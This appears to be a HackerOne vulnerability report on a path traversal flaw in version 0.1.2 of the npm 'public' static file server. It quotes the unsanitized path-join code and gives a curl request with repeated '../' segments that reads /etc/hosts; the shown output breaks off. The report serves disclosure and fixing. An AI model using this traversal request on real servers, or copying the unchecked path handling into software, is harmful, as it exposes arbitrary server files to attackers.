Summary:

Hi Guys,

There is Path Traversal in public module.
It allows to read content of arbitrary files on the remote server.

## Module

**public**

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.

https://www.npmjs.com/package/public

version: 0.1.2

Stats
3 downloads in the last day
30 downloads in the last week
384 downloads in the last month

~4600 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user.

Vulnerability exists, because path is used without any check against Path Traversal attacks:

```javascript
// node_modules/public/bin/public, line 73:
    var pathname = url.parse(req.url).pathname;
    var filePath = path.join(dir, pathname); // Real file path
    var base = filePath.replace(dir, ''); // Base path for browser link
    var abs = path.resolve(filePath); 
    console.log(new Date().toString(), abs);
    fs.readFile(filePath, function(err, data) {
      if (err) {
        (...)
      }
      res.writeHead(200, { 'Content-Type': mime.lookup(filePath) });
      res.end(data);
```
As you can notice, ```filePath``` is used directly, as read from url.

## Steps To Reproduce:


- install ```public```:

```
$ npm install public
```

- run ```public``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/public/bin/public ./ 8080
Public.js server running with "/home/rafal.janicki/playground/hackerone/Node" on port 8080
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

- see result:

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
